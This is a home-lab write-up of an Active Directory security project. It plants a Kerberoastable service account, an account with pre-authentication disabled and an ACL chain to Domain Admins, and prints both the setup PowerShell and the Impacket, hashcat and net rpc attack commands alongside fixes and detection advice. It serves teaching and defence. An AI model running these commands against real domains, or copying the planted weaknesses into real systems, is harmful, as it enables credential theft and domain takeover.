# Phase 2 — Sabotage

> Deliberately introducing realistic misconfigurations into the clean domain, so
> Phase 3 (Attack) has something to exploit. Each sabotage mirrors a mistake real
> admins actually make. For every one: **what** I planted, **why** it is exploitable,
> and **how it should be fixed**.

**Before starting:** a VirtualBox snapshot of the clean lab was taken
(`lab-sano-antes-de-sabotear`, DC01 + CL01) so the environment can be rolled back.

| # | Misconfiguration | Victim account | Attack it enables | Status |
|---|------------------|----------------|-------------------|--------|
| 1 | Service account with SPN + weak password | `svc_sql` | Kerberoasting | ✅ Planted |
| 2 | Account with Kerberos pre-auth disabled + weak password | `piotr.wisniewski` | AS-REP Roasting | ✅ Planted |
| 3 | Abusable ACL chain (ForceChangePassword + GenericAll) | `piotr` → `robert` → `Domain Admins` | BloodHound path → DA | ✅ Planted |

Reproducible scripts: [`scripts/sabotage-01-kerberoasting.ps1`](../scripts/sabotage-01-kerberoasting.ps1) ·
[`scripts/sabotage-02-asrep-roasting.ps1`](../scripts/sabotage-02-asrep-roasting.ps1) ·
[`scripts/sabotage-03-acl-abuse.ps1`](../scripts/sabotage-03-acl-abuse.ps1)

---

## Sabotage #1 — Kerberoastable service account

### What I planted
A service account `svc_sql` in `OU=ServiceAccounts,OU=Nordwind`, with:
- a **weak password** (`Summer2023!`) and `PasswordNeverExpires`,
- a registered **SPN**: `MSSQLSvc/dc01.nordwind.local:1433`.

```powershell
New-ADUser -Name "svc_sql" -SamAccountName "svc_sql" `
  -UserPrincipalName "svc_sql@nordwind.local" `
  -Path "OU=ServiceAccounts,OU=Nordwind,DC=nordwind,DC=local" `
  -AccountPassword (ConvertTo-SecureString "Summer2023!" -AsPlainText -Force) `
  -Enabled $true -PasswordNeverExpires $true
setspn -A MSSQLSvc/dc01.nordwind.local:1433 svc_sql
```

### Why it is exploitable
A Service Principal Name maps a service to its owning account. When **any**
authenticated domain user requests a TGS for that SPN, the KDC encrypts the ticket
with the **NTLM hash of the owning account's password** — and hands it over without
checking whether the requester has any right to the service. The requester can then
crack that ticket **offline**:

- **No privileges needed** — one ordinary domain user is enough.
- **Offline** — the ticket is cracked on the attacker's machine; the DC never sees it.
- **Silent** — no logon attempt, so account-lockout policy never triggers.

The SPN itself is legitimate and necessary. The real defect is the **weak,
human-chosen password** behind the service account (service passwords are "machine"
passwords no one types daily, so there is no excuse for them to be weak).

### Attack (Phase 3, pending)
```bash
GetUserSPNs.py nordwind.local/<user>:'<pass>' -dc-ip 192.168.10.10 -request -outputfile tgs.txt
hashcat -m 13100 tgs.txt rockyou.txt      # RC4
```

### How to fix it
1. **gMSA (Group Managed Service Accounts)** — Windows auto-generates and rotates a
   ~240-character random password. Offline cracking becomes infeasible. The real cure.
2. If gMSA is not possible: a **long random password** (25+ chars) on the account.
3. Force **AES** encryption types instead of RC4 (raises cracking cost).
4. Monitor **Event ID 4769** for bursts of RC4 TGS requests.

---

## Sabotage #2 — AS-REP-roastable account (pre-auth disabled)

### What I planted
An existing user, `piotr.wisniewski` (OU=IT), with **Kerberos pre-authentication
disabled** and a **weak password** (`Autumn2024!`).

```powershell
Set-ADAccountPassword -Identity piotr.wisniewski -Reset `
  -NewPassword (ConvertTo-SecureString "Autumn2024!" -AsPlainText -Force)
Set-ADAccountControl -Identity piotr.wisniewski -DoesNotRequirePreAuth $true
```

### Why it is exploitable
Kerberos pre-authentication forces the client to prove it knows the password (by
encrypting a timestamp with the user's hash) **before** the KDC returns the AS-REP.
That AS-REP contains material encrypted with the user's password hash, so pre-auth is
the lock that stops a stranger from obtaining crackable material for an account that
is not theirs.

With `DONT_REQ_PREAUTH` set, the KDC returns the AS-REP to **anyone who merely names
the account** — no proof required. The attacker now holds a blob encrypted with the
victim's hash and cracks it offline.

- **Zero credentials needed** — only a valid username. This is often the *first*
  attack against a domain.
- **Offline / silent** — same as above: no logon, no lockout, no DC-side noise.

Admins typically disable pre-auth to accommodate legacy apps/devices that implement
Kerberos poorly — which is why it tends to land on technical/IT accounts.

### Attack (Phase 3, pending)
```bash
# No credentials, from a username list:
GetNPUsers.py nordwind.local/ -dc-ip 192.168.10.10 -usersfile users.txt -no-pass -format hashcat
hashcat -m 18200 asrep.txt rockyou.txt    # AS-REP (RC4)
```

### How to fix it
1. **Never disable pre-authentication** unless strictly required and documented.
2. If a legacy app forces it, **isolate** the account and give it a **long random
   password** (uncrackable).
3. **Audit** regularly which accounts carry `DONT_REQ_PREAUTH` (BloodHound flags them).
4. Monitor **Event ID 4768** for AS-REQs with pre-auth type 0 / RC4.

---

## Sabotage #3 — Abusable ACL chain to Domain Admin

### What I planted
A 2-hop attack path built from misconfigured ACLs (object permissions), starting from
a foothold on `piotr.wisniewski`:

```
piotr.wisniewski ──ForceChangePassword──► robert.dabrowski ──GenericAll──► Domain Admins
```

```powershell
$robert = (Get-ADUser robert.dabrowski).DistinguishedName
dsacls "$robert" /G "NORDWIND\piotr.wisniewski:CA;Reset Password"   # hop 1

$da = (Get-ADGroup "Domain Admins").DistinguishedName
dsacls "$da" /G "NORDWIND\robert.dabrowski:GA"                       # hop 2
```

### Why it is exploitable
In AD, a permission can be **power over another object**, not just access to a
resource. If you control an account, you effectively *become* it and inherit its
permissions — and if one of those permissions is control over a more privileged
account or group, you climb. Chained together, these create an **attack path**:

- **Hop 1 — `ForceChangePassword`:** piotr can reset robert's password without
  knowing the old one → piotr logs in as robert.
- **Hop 2 — `GenericAll` over `Domain Admins`:** robert has full control over the
  group → robert adds himself as a member → Domain Admin.

None of these permissions should exist: an ordinary user resetting another's password
is a Help Desk function, and no user should ever control the Domain Admins group.
In real environments these appear through rushed delegations, forgotten "temporary"
grants and unreviewed inheritance — invisible until **BloodHound** draws the path.

### Attack (Phase 3, pending)
```bash
# 1. As piotr: reset robert's password
net rpc password robert.dabrowski 'NewPass123!' \
    -U nordwind.local/piotr.wisniewski%'<piotr_pass>' -S 192.168.10.10
# 2. As robert: add self to Domain Admins
net rpc group addmem "Domain Admins" robert.dabrowski \
    -U nordwind.local/robert.dabrowski%'NewPass123!' -S 192.168.10.10
# 3. robert is now Domain Admin → DCSync, hash dump, etc.
```
Collect with SharpHound first and confirm BloodHound renders the
`piotr → Domain Admins` path.

### How to fix it
1. Review delegations regularly (run BloodHound defensively).
2. Apply a **tiered admin model** — privileged accounts isolated; normal users never
   hold rights over admin groups.
3. Remove forgotten "temporary" grants; audit `WriteDacl` / `WriteOwner` / `GenericAll`
   on sensitive objects.
4. **AdminSDHolder** auto-restores clean ACLs on protected groups every ~60 min.

---

## The full chain (zero to Domain Admin)

The three sabotages combine into one end-to-end story, mirroring a real AD exam box:

```
1. No credentials ──AS-REP Roast──►      crack piotr           (Sabotage #2)
2. As piotr       ──ForceChangePassword──► become robert        (Sabotage #3, hop 1)
3. As robert      ──GenericAll──►          join Domain Admins   (Sabotage #3, hop 2)
4. Domain Admin   → DCSync, dump all hashes
```

Kerberoasting `svc_sql` (Sabotage #1) provides an alternative foothold, giving the
writeup two independent entry paths.

---

## Kerberoasting vs AS-REP Roasting (quick reference)

| | Kerberoasting | AS-REP Roasting |
|---|---|---|
| Target | account with an **SPN** | account **without pre-auth** |
| Credentials required | **yes** (any domain user) | **no** (username only) |
| Ticket requested | **TGS** | **AS-REP** |
| Tool | `GetUserSPNs.py` | `GetNPUsers.py` |
| hashcat mode | `13100` | `18200` |
